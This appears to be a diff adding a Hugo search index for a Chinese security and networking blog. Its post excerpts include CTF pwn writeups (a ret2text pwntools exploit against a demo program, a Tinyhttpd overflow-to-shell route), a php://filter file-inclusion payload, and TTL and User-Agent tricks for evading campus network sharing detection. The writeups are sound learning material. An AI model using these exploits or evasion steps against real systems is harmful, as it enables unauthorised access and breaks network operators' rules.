@@ -1,0 +1,105 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><search><entry><title>网站迁移</title><url>/post/site-migration.html</url><categories><category>博客</category></categories><tags/><content type="html"> 因网站备案审核不通过，迁移至： izeroo.eu.org</content></entry><entry><title>透明代理的旁路由实现、原理和常见的误区</title><url>/post/router-transparent-proxy.html</url><categories><category>网络</category></categories><tags><tag>旁路由</tag><tag>透明代理</tag><tag>redirect</tag><tag>tproxy</tag></tags><content type="html"> 首先介绍旁路由是什么，旁路由也叫旁路网关，比较典型的架构是通过一个单网口的设备（N1盒子、开发板等）接入主路由，然后在主路由的的DHCP选项里将LAN口网关设置为该设备的IP（也就是所谓的“网关互指”，其实根本就没有互指，主路由的网关依然是原来的网关，只是接入主路由的设备的网关变成了旁路由），流量经由该设备分流，实现科学研究的目的。
+提醒，使用旁路由时必须关闭主路由的硬件加速，否则会出现各种各样的问题！！！
+具体的网络拓扑如下图所示。
+（图片来自： Openwrt 作为旁路网关（不是旁路由、单臂路由）的终极设置方法，破解迷思 - 少数派 (sspai.com) ）
+再分析流量的走向，在理想情况下，我们会有下图的流量走向。
+（图片来自： 旁路由的原理与配置一文通 - Eason Yang&amp;amp;rsquo;s Blog ）
+可是事实真的如此么？其实不然，要达到这种理想情况，目前大部分的教程给出的方法都多多少少存在的问题，实际上的网络走向不会是这样，下行流量也会经过旁路由，导致跑国内 speedtest 的时候旁路由的利用率暴涨。可以用 htop 或者 btop观察到这一点。
+造成这种情况的有两种原因：
+在旁路由上进行了SNAT，导致所有的连接都必须经过旁路由，即iptables -t nat -I POSTROUTING -j MASQUERADE规则 透明代理的实现原理决定了实现透明代理必须将两条TCP流拼接在一起（UDP未验证，不是本文的重点），这样所有的连接都也必须经过旁路由 第一点的情况比较常见，其实也是情有可原，因为如果不在旁路由上开启SNAT，很可能主路由对流量的处理会出现问题，即：不开启透明代理的情况下无法访问WAN区域的主机。
+造成此情况的原因有以下：
+由于主路由设置了net.bridge.bridge-nf-call-*tables = 1，导致无线流量未被正确的NAT，此时有线网络可以正常访问WAN区域的主机。原因见： 关于旁路由设置后，主路由WIFI无法上网的问题_旁路由作为网关不能上网_锦夏挽秋的博客-CSDN博客 未开启IP转发，即net.ipv4.ip_forward = 0，导致旁路由在收到其他设备发送的数据包时不会转发给主路由。原因见： networking - What exactly happens when I enable …</content></entry><entry><title>HWS 2023 第七期夏令营（硬件安全营）wp</title><url>/post/hws-2023-pwn-wp.html</url><categories><category>CTF</category></categories><tags><tag>PWN</tag><tag>writeup</tag></tags><content type="html"> ezhttp 程序基于 Tinyhttpd ，main函数如下，类似常见的TCP fork server，不过这里用的是pthread_create()而不是fork()：
+跟进新的线程：
+代码比较长，总结下来就是读取HTTP请求的每一行，然后提取出请求METHOD、请求URL、HTTP Headers。然后根据METHOD类型判断是GET请求还是POST，如果是GET请求还要判断访问的URL是不否需要登陆就可以访问，登陆使用HTTP Basic认证（HTTP头：Authorization: Basic &amp;amp;lt;凭证&amp;amp;gt;），其中凭证采用BASE64编码，解码函数存在溢出，可以覆写到URL变量。另外在检查URL是否需要登陆时存在绕过漏洞，构造/aaa?.css即可使logged_in为1，为后面的执行cgi程序做准备。
+程序在Tinyhttpd的基础上修复了目录穿越的CVE，在提取出URL检查了是否存在..，但是后续的base64解码可以覆盖到URL，栈结构如下：
+综上，可见token可以覆盖到url变量，base64_decode函数没有限制传入参数的长度，这样就达到了目录穿越检查的绕过。另外说一点ida反编译出来的buf3的长度其实是不对的，base64_decode()函数传入的参数就不是v18而是&amp;amp;amp;buf3[21]，即Authorization: Basic 之后的字符串。
+接下来看登陆之后的处理：
+从URL中提取出了query_string，并将URL从?处截断，设置cgi=1，然后通过sprintf将htdocs和url拼接在一起，最后检查path是否存在以及是否是目录或者是文件。如果是文件并且有可执行权限的话，在cgi=1时就会当作cgi进行执行。
+跟进执行cgi的函数，程序和tinyhttpd的源码有所不同，没有用到两次pipe函数的fd，猜测可能是因为管道的读取要读取满缓冲区才会返回，而socket的缓冲区就是一次tcp请求的内容，使用socket才能正常实现shell的交互。
+其中关键的函数是execl，通过前面的dup2函数已经将socket的fd复制到了stdin和stdout，这样cgi程序就能读取stdin的内容然后从stdout返回，通过构造path为/bin/sh的路径即可getshell。
+最终exp如下： …</content></entry><entry><title>how2heap全系列（持续更新）</title><url>/post/how2heap.html</url><categories><category>PWN</category></categories><tags><tag>PWN</tag><tag>how2heap</tag></tags><content type="html"> 在此记录学习how2heap的过程。感谢shellphish的 how2heap 项目。
+本文基于commit b4e4e487fd913d072b616713feb9f5e7a1e53873 ，glibc 2.36，相比于之前的版本代码可能会复杂一点。
+需要的前置知识：
+csapp malloc lab ：对内存管理的理解有很大的帮助
+glibc的ptmalloc的大概了解 需要知道chunk的结构，针对不同大小的chunk有哪些管理方式
+/* This struct declaration is misleading (but accurate and necessary). It declares a &amp;amp;#34;view&amp;amp;#34; into memory allowing access to necessary fields at known offsets from a given base. See explanation below. */ struct malloc_chunk { INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ // 如果前一个 chunk 是空闲的，该域表示前一个 chunk 的大小，如果前一个 chunk 不空闲，该域无意义。 INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ // 当前 chunk 的大小，并且记录了当前 chunk 和前一个 chunk 的一些属性性，包括前一个 chunk 是否在 // 使用中，当前 chunk 是否是通过 mmap 获得的内存，当前 chunk 是否属于非主分配区。 struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* 指针 fd 和 bk 只有当该 chunk 块空闲时才存在，其作用是用于将对应的空闲 chunk 块加入到 空闲 chunk 块链表中统一管理，如果该 chunk 块被分配给应用程序使用，那么这两个指针 也就没有用（该 chunk 块已经从空闲链中拆出）了，所以也当作应用程序的使用空 …</content></entry><entry><title>CSAPP Malloc Lab</title><url>/post/csapp-malloc-lab.html</url><categories><category>技术</category></categories><tags><tag>CSAPP</tag><tag>Malloc Lab</tag></tags><content type="html"><![CDATA[  最近准备研究堆题，于是打算把 CSAPP 的 malloc lab 给完成了，记录一下知识点。
+为什么要使用动态内存分配 虽然可以使用低级的 mmap 和 munmap 函数来创建和删除虚拟内存的区域，但是当程序运行时需要额外虚拟内存时，用动态内存分配器（dynamic memory allocator)更方便，也有更好的可移植性。
+什么是动态内存分配器 动态内存分配器维护着一个进程的虚拟内存区域，称为堆（heap）（见下图）。它紧接在未初始化的数据区域（.bss段）后开始，并向高地址增长。 对于每个进程，内核维护着一个变量 brk，它指向堆的顶部。
+分配器将堆视为一组不同大小的块（block）的集合来维护。每个块都是一块连续的虚拟内存，要么是已分配的，要么是空闲的。已分配的块显式地保留为供应用程序使用。空闲块保持空闲，直到它显式地被应用所分配。一个已分配的块保持已分配状态，直到它被释放。
+函数定义 malloc C 标准库提供了一个函数名为 malloc 显式内存分配器。程序通过调用 malloc 函数来从堆中分配块。
+#include &amp;lt;stdlib.h&amp;gt; /* 返回值:若成功则返回已分配块的指针，出错返回 NULL */ void *malloc(size_t size); malloc 函数返回一个指针，指向大小为至少 size 字节的内存块，这个块会为可能包含在这个块内的任何数据对象类型做对齐。实际中，对齐依赖于编译代码在 32 位模式（gcc -m32）还是 64 位模式中运行。在 32 位模式中，malloc 返回的块的地址总是 8 的倍数。在 64 位模式中，该地址总是 16 的倍数。
+sbrk sbrk 函数通过将内核的 brk 指针增加 incr 来扩展和收缩堆。如果成功，它就返回brk 的旧值，否则，它就返回 -1，并将 errono 设置为 ENOMEM ，如果 incr 为零， sbrk 就返回 brk 的当前值。
+#include &amp;lt;stdlib.h&amp;gt; /* 返回值：若成功则为旧的brk指针，出错返回 -1 */ void *sbrk(intptr_t incr); free 程序通过调用 free 函数来释放已分配的堆块。
+#include &amp;lt;stdlib.h&amp;gt; void free(void …  ]]></content></entry><entry><title>Canary绕过</title><url>/post/canary-bypass.html</url><categories><category>PWN</category></categories><tags><tag>PWN</tag><tag>Canary</tag></tags><content type="html"><![CDATA[   Canary介绍 本节摘自CTF WIki，感谢CTF Wiki项目
+Canary 的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。
+在Linux中，Canary是一种栈溢出的防护机制，通常栈溢出都是输入超长的内容越过栈上的变量从而覆盖栈上返回地址的值，开启Canary后，在进入函数时会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：
+mov rax, qword ptr fs:[0x28] mov qword ptr [rbp - 8], rax 在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 Canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。
+mov rdx,QWORD PTR [rbp-0x8] xor rdx,QWORD PTR fs:0x28 je 0x4005d7 &amp;lt;main+65&amp;gt; call 0x400460 &amp;lt;__stack_chk_fail@plt&amp;gt; 在 GCC 中使用 Canary 可以在 GCC 中使用以下参数设置 Canary:
+-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护 -fstack-protector-all 启用保护，为所有函数插入保护 -fstack-protector-strong -fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护 -fno-stack-protector 禁用保护 绕过Canary保护示例 这里有一份存在Canary绕过漏洞的代码，和另一篇文章 ret2text的原理及利用 的代码类似，但是编译时开启了Canary保护，无法直接利用：
+// canary.c // gcc canary.c -o canary-pie -fstack-protector-all -no-pie -Og -Wall #include &amp;lt;stdio.h&amp;gt; #include …  ]]></content></entry><entry><title>ret2text的原理及利用</title><url>/post/exploiting-ret2xx.html</url><categories><category>PWN</category></categories><tags><tag>PWN</tag><tag>ret2xx</tag></tags><content type="html"><![CDATA[  原理 ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。
+这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。
+——摘自CTF Wiki 基本 ROP - CTF Wiki (ctf-wiki.org) 示例 下面看一个简单的例子：不开启PIE，不开启Canary，利用ret2text跳转到程序中的后门函数。
+// demo.c // gcc demo.c -o demo -fno-stack-protector -no-pie -Og #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; void backdoor() { printf(&#34;Now entering backdoor...\n&#34;); execve(&#34;/bin/bash&#34;, 0, 0); printf(&#34;Leaving backdoor...\n&#34;); } void func(){ char buffer[16]; scanf(&#34;%s&#34;, buffer); printf(&#34;Input: %s\n&#34;, buffer); } int main() { printf(&#34;Enter something...\n&#34;); func(); printf(&#34;Normal exit.\n&#34;); return 0; } checksec查看保护：
+[*] &#39;/home/zero/src/pwn/stack-overflow/demo&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 利用过程 func函数中含有危险函数scanf且并未限制长度，因此会造成缓冲区溢出。我们没有开启PIE和Canary保护，因此直接将返回地址覆盖为backdoor函数的地址即可。
+gdb在func函数下断点：当前rsp保存的地址即为返回地址，也就是0x7fffffffdc98
+buf在栈上的地址：0x7fffffffdc80
+因此需要覆盖0x18个字节，然后再填入backdoor地址0x401156即可。exp如下：
+# -*- coding: UTF-8 -*- from pwn import * elf = ELF(&#39;./demo&#39;) backdoor = elf.symbols[&#39;backdoor&#39;] p = process(elf.path) p.sendline(b&#39;a&#39; * 0x18 + p64(backdoor)) p.interactive() 运行，成功利用。
+  ]]></content></entry><entry><title>从Wordpress迁移到Hugo</title><url>/post/migrating-to-hugo.html</url><categories><category>博客</category></categories><tags><tag>Hugo</tag><tag>Wordpress</tag><tag>waline</tag></tags><content type="html"> 大概半年以前？我尝试过从Wordpress迁移到Hexo，但是有太多的问题没法解决：WP的文章在导出后整理图片路径很麻烦，也没想到很好的同步文章到服务器的方式，因此简单尝试后还是放弃了。
+最近开始梳理过去的知识点，记录每周的学习内容，但是用WP写作的话每次都要开浏览器，不是很方便也不是WYSIWYG，修改文章也不如编辑Markdown文档方便，还得发布后再去查看，于是考虑换个方式写文章。本来是打算用Hexo的，因为主题很漂亮（Hexo-NexT主题的颜值是真的高啊🤤）。然后由于没法比较优雅地解决图片路径的问题，谷歌着谷歌着就发现了另外一个静态网页框架：Hugo，比Hexo 更流行 ，性能也更好，干脆就用Hugo了。 Hexo-NexT主题现在Hugo也有了移植： Hugo-NexT ，因此我最后还是选择了使用Hugo作为博客框架。
+花了两天时间，试过了N个Markdown编辑器，从Hexo转到了Hugo，趟过不少坑，总算是打通了写作即发布的流程，于是开篇文章记录一下。
+Markdown编辑器的艰难选择 Typora不是开始收费了嘛，于是打算换个别的编辑器，在尝试过Joplin、Mark Text、Notable、Notion之后发现都不是很好用，而且对于文档中的图片保存路径自定义选项不够丰富（大坑之一，路径一旦不对图片就加载不出来，但是网页能正常显示的路径对于本地编辑器来说又是错的，体验很差），折腾了半天还是换回了Typora，真香😂
+Hugo配置 hugo -D or hugo server? Hugo provides its own webserver which builds and serves the site. While hugo server is high performance, it is a webserver with limited options. Many run it in production, but the standard behavior is for people to use it in development and use a more full featured server such as Nginx or Caddy.
+hugo server | Hugo (gohugo.io) 根据官方文档，hugo …</content></entry><entry><title>Hugo的文件管理方案</title><url>/post/Hugo%E7%9A%84%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E6%96%B9%E6%A1%88/</url><categories><category>博客</category></categories><tags><tag>Hugo</tag></tags><content type="html"> 如果需要在文章中插入图片，则新建同名文件夹，在文件夹内保存文章为index.md，图片在md文档相同目录
+参考： Hugo 的文件管理方案 | Jeremy&amp;rsquo;s blog (isyin.cn)</content></entry><entry><title>Quine</title><url>/post/quine/</url><categories><category>编程</category></categories><tags/><content type="html"><![CDATA[  s = &#34;&#39;s = &#39; + repr(s) + &#39;\\nprint(&#39; + s + &#39;)&#39;&#34; print(&#39;s = &#39; + repr(s) + &#39;\nprint(&#39; + s + &#39;)&#39;)   ]]></content></entry><entry><title>关于</title><url>/about.html</url><categories/><tags/><content type="html"> niemand</content></entry><entry><title>世界，你好！</title><url>/post/hello-world.html</url><categories><category>博客</category></categories><tags><tag>Hugo</tag><tag>开始</tag></tags><content type="html"> “使用 weight 关键字置顶文章。”
+Hugo 是现今世界上最快的网站建设框架，也是最流行的开源静态站点生成器之一。 凭借其惊人的速度和灵活性，Hugo 让建设网站再次变得有趣起来。
+快速开始 发表新文章 $ hugo new hello-world.md 更多信息： 内容格式 启动服务 $ hugo server 更多信息： Hugo 服务命令行 生成静态文件 $ hugo 更多信息： Hugo 建站 部署到服务器 $ hugo deploy 更多信息： Hugo 发布 祝你好运，相信你会喜欢上 Hugo 建站的旅程！</content></entry><entry><title>Linux pwn环境搭建</title><url>/post/linux-pwn-env-setup/</url><categories><category>PWN</category></categories><tags/><content type="html"><![CDATA[  1.安装pwntools
+sudo apt-get update sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential python3 -m pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple python3 -m pip install --upgrade pip python3 -m pip install --upgrade pwntools echo export PATH=&#34;/home/`whoami`/.local/bin:\$PATH&#34; &gt;&gt; ~/.zshrc 2.安装pwngdb
+cd ~/.local git clone https://github.com/pwndbg/pwndbg cd pwndbg ./setup.sh 3.安装splitmind（可选）
+cd ~/.local git clone https://github.com/jerdna-regeiz/splitmind echo &#34;source $PWD/splitmind/gdbinit.py&#34; &gt;&gt; ~/.gdbinit echo &#34;setw -g mouse on&#34; &gt;&gt; ~/.tmux.conf # enable tmux mouse support cat &lt;&lt; EOF &gt;&gt; ~/.gdbinit python import splitmind (splitmind.Mind() .tell_splitter(show_titles=True) .above(display=&#34;stack&#34;) .right(display=&#34;regs&#34;) .right(of=&#34;main&#34;, display=&#34;disasm&#34;) .below(display=&#34;backtrace&#34;, size=&#34;30%&#34;) .show(&#34;legend&#34;, on=&#34;disasm&#34;) ).build(nobanner=True) end EOF 还有一些别的插件和设置，不细说了，可以参考我的~/.gdbinit
+source ~/.local/pwndbg/gdbinit.py #source ~/.local/peda/peda.py #source ~/.gdbinit-gef.py source ~/.local/Pwngdb/pwngdb.py source ~/.local/Pwngdb/angelheap/gdbinit.py source /home/zero/.local/splitmind/gdbinit.py set debuginfod enabled on set ida-enabled off set follow-fork-mode parent set follow-exec-mode same set listsize 20 set context-source-code-lines 30 define hook-run python import angelheap angelheap.init_angelheap() end end python import splitmind (splitmind.Mind() .tell_splitter(show_titles=True) .above(display=&#34;stack&#34;) .right(display=&#34;regs&#34;) .right(of=&#34;main&#34;, display=&#34;disasm&#34;) .below(display=&#34;backtrace&#34;, size=&#34;30%&#34;) .show(&#34;legend&#34;, on=&#34;disasm&#34;) ).build(nobanner=True) end 最终效果：
+  ]]></content></entry><entry><title>记Openwrt+旁路由实现dns劫持分流加密</title><url>/post/encrypting-dns/</url><categories><category>网络</category></categories><tags><tag>软路由</tag><tag>DNS</tag></tags><content type="html"><![CDATA[  需求： 劫持并加密所有明文DNS请求，对于大陆的IP直接使用阿里公共DNS(https://223.5.5.5/dns-query)实现加密解析，非大陆IP走1.1.1.1，实现对不同域名分流查询。
+另外由于校园网域名解析结果都是内网IP，需要走UDP53协议才能被学校劫持，因此这部分DNS请求需要转发到114.114.114.114。
+架构： Openwrt主路由 IP：192.168.1.1
+OrangePi Zero 2旁路由 IP：192.168.1.2
+在Openwrt内LAN口自定义DCHP Option，设置网关为旁路由IP，DNS服务器为主路由IP。
+具体设置： 主路由 1.设置网关为192.168.1.2, DNS服务器为192.168.1.1 2.DHCP/DNS设置下设置DNS转发和重绑定保护白名单 转发到旁路由53端口也可，mosdns-cn可以取代systemd-resolved作为域名解析服务，并且能够加密请求。
+补充：设置忽略解析文件，指定主路由接口DNS 如果没有设置忽略解析文件，发往192.168.1.1 的dns请求将不会被转发到旁路由！只有在主路由上发往127.0.0.1的dns请求会被转发到旁路由，太坑了！
+设置忽略解析文件在我这边会莫名其妙自动取消，所以需要给每个接口指定DNS服务器为192.168.1.2
+3.劫持所有明文DNS请求到主路由，防止DNS泄露 参考 [OpenWrt Wiki] DNS hijacking uci -q delete firewall.dns_int uci set firewall.dns_int=&#34;redirect&#34; uci set firewall.dns_int.name=&#34;Intercept-DNS&#34; uci set firewall.dns_int.src=&#34;lan&#34; uci set firewall.dns_int.src_dport=&#34;53&#34; uci set firewall.dns_int.proto=&#34;tcp udp&#34; uci set firewall.dns_int.target=&#34;DNAT&#34; uci set firewall.dns_int.dest=&#34;lan&#34; uci set firewall.dns_int.dest_ip=&#34;192.168.1.1&#34; uci commit firewall /etc/init.d/firewall restart 至此已经完成了主路由方面的设置。
+主路由转发DNS查询给旁路由并缓存查询结果，对特定域名使用自定义DNS服务器查询。
+旁路由 旁路由需要安装v2raya和mosdns-cn，github地址：
+https://github.com/v2rayA/v2rayA https://github.com/IrineSistiana/mosdns-cn v2raya设置： 透明代理开启，IP转发和端口分享开启。
+mosdns-cn配置： ./mosdns-cn -s :53 --local-upstream &#39;https://223.5.5.5/dns-query&#39; --local-ip &#39;geoip.dat:cn&#39; --local-domain &#39;geosite.dat:cn&#39; --remote-upstream &#39;https://1.1.1.1/dns-query&#39; --remote-domain &#39;geosite.dat:geolocation-!cn&#39; --log-file /tmp/mosdns.log -v 测试正常后可以以服务的形式安装
+./mosdns-cn --service install -s :53 --local-upstream &#39;https://223.5.5.5/dns-query&#39; --local-ip &#39;geoip.dat:cn&#39; --local-domain &#39;geosite.dat:cn&#39; --remote-upstream &#39;https://1.1.1.1/dns-query&#39; --remote-domain &#39;geosite.dat:geolocation-!cn&#39; --log-file /tmp/mosdns.log -v ./mosdns-cn --service start 最后：
+设置IP为静态，地址192.168.1.2，网关192.168.1.1，DNS服务器127.0.0.1
+  ]]></content></entry><entry><title>校园网多设备检测绕过</title><url>/post/bypass-campus-network-detect/</url><categories><category>网络</category></categories><tags><tag>校园网</tag></tags><content type="html"> 本文参考以下文章：
+关于某大学校园网共享上网检测机制的研究与解决方案 (sunbk201.site) OpenWrt 编译步骤与命令详解教程 - P3TERX ZONE 目前主要的检测方式有以下几种
+基于 HTTP 数据包请求头内的 User-Agent 字段的检测 HTTP数据包请求头存在一个叫做 User-Agent 的字段，该字段通常能够标识出操作系统类型，例如：
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36 Edg/89.0.774.45
+Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405
+校园网会通过多次抓包检测此字段，若发现同时出现例如Windows NT 10.0 iPad 的字段，则判定存在多设备上网。
+基于 IPv4 数据包包头内的 TTL 字段的检测 存活时间（英语：Time To Live，简写TTL）是电脑网络技术的一个术语，指一个数据包在经过一个路由器时，可传递的最长距离（跃点数）。
+每当数据包经过一个路由器时，其存活次数就会被减一。
+当其存活次数为0时，路由器便会取消该数据包转发，IP网络的话，会向原数据包的发出者发送一个ICMP TTL数据包以告知跃点数超限。
+其设计目的是防止数据包因不正确的路由表等原因造成的无限循环而无法送达及耗尽网络资源。
+这是一个比较有效且合理的检测技术，IPv4数据包下存在 TTL（Time To Live）这一字段，数据包每经过一个路由器（即经过一个网段），该TTL值就会减一。
+不同的操作系统的默认 TTL 值是不同的，Windows 是 128， MAC OS/IOS、Linux 是 64。
+因此如果我们自己接入路由器到校园网，我们的通过路由器的数据包会变为 127 或 63，一旦校园网抓包检测到这种数据包TTL不是128或64，就会判定为用户接入了路由器。
+防共享上网检测的解决方案 对于校园网重重的检测，我们似乎已经不可能从终端级提出一个完美的解决方案，因此，下面的解决方案都是基于网关级的。简单来说，我们需要在路由器上动手脚。
+路由器固件我们选择OpenWrt，这是一个开源的路由器系统，允许我们自定义其系统内核以及添加自定义插件。
+不过我们需要自己交叉编译 OpenWRT，同学们需要有一定的功底。
+基于 IPv4 数据包包头内的 TTL 字段的检测 应对思路很简单：修改 TTL 为固定值。
+# 在 OpenWRT 路由器上安装必要的软件包 opkg update &amp;amp;&amp;amp; opkg install iptables-mod-ipopt kmod-ipt-ipopt 进入 OpenWRT 防火墙设置，在 自定义设置 中填入以下内容（ WAN 、LAN 口名称需根据实际情况进行更改 ） iptables -t mangle -A POSTROUTING -j TTL --ttl-set 64 点击 保存并应用 基于 HTTP 数据包请求头内的 User-Agent 字段的检测 使用 UA2F 修改 UA 这可能是最好的方案，UA2F 可以修改所有端口的数据包，而且性能不错，不过依旧需要编译。
+具体参见： Zxilly/UA2F: Change User-agent to F-words on OpenWRT router to prevent being checked. (github.com)
+验证方式： UA检测-HTTP (233996.xyz)</content></entry><entry><title>极客大挑战 2019 Secret File Writeup</title><url>/post/secret-file-writeup/</url><categories><category>CTF</category></categories><tags/><content type="html"> 打开网站啥都没看到，Ctrl+A全选看到了隐藏的信息
+点进去后可以看到另外一个页面，可以看到链接是指向action.php，但是点进去却看不到信息而且跳转到了另外一个url
+应该是跳转了，用curl查看
+果然可以看到302重定向，下面注释里藏着我们真正需要的页面
+flag.php：
+访问之后看不到需要的内容，看来不能直接拿到flag，但是可以利用php伪协议查看flag.php的源码
+php://filter用于读取读取php文件源码内容(直接包含脚本格式文件会解析，无法直接获取文件源码)。用法：
+index.php?file=php://filter/read=convert.base64-encode/resource=1.php
+即可得到base64加密后的源码
+解密得到flag</content></entry><entry><title>世界，您好！</title><url>/post/hello-world/</url><categories><category>博客</category></categories><tags/><content type="html"> 欢迎使用WordPress。这是您的第一篇文章。编辑或删除它，然后开始写作吧！</content></entry><entry><title>站点示例</title><url>/flinks.html</url><categories/><tags/><content type="html"> 如想交换本站友情链接，请在评论区留下你的站点信息，格式参考如下：
+- name: Hugo-NexT desc: Hugo NexT 官方预览网站。 avatar: https://hugo-next.eu.org/imgs/hugo_next_avatar.png link: https://hugo-next.eu.org</content></entry></search>
